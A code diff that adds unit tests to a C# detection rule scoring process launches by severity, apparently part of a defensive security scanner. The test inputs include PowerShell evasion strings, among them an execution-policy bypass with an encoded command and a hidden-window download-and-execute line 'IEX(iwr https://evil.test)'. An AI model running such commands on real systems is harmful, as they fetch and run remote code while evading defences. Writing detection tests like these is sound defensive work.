@@ -448,6 +448,33 @@ public class ProcessStartRuleTests
         result.reason.Should().Contain("Staged loader chain");
     }
 
+    [Theory]
+    [InlineData("powershell")]
+    [InlineData("cmd")]
+    [InlineData("wscript")]
+    public void DetermineSeverity_ExtensionlessLolBinTarget_ReturnsHigh(string targetLower)
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: targetLower,
+            argumentsLower: "<unknown/no-arguments>");
+
+        result.severity.Should().Be(Severity.High);
+        result.reason.Should().Contain("LOLBin execution");
+    }
+
+    [Theory]
+    [InlineData("-ExecutionPolicy Bypass -EncodedCommand SQBFAFgA")]
+    [InlineData("-NoProfile -WindowStyle Hidden -Command IEX(iwr https://evil.test)")]
+    public void DetermineSeverity_LongPowerShellEvasionArgumentsOnUnknownTarget_ReturnsHigh(string argumentsLower)
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "<unknown/non-literal>",
+            argumentsLower: argumentsLower);
+
+        result.severity.Should().Be(Severity.High);
+        result.reason.Should().Contain("suspicious");
+    }
+
     [Fact]
     public void DetermineSeverity_SimpleProcessStart_RemainsGenericExecution()
     {
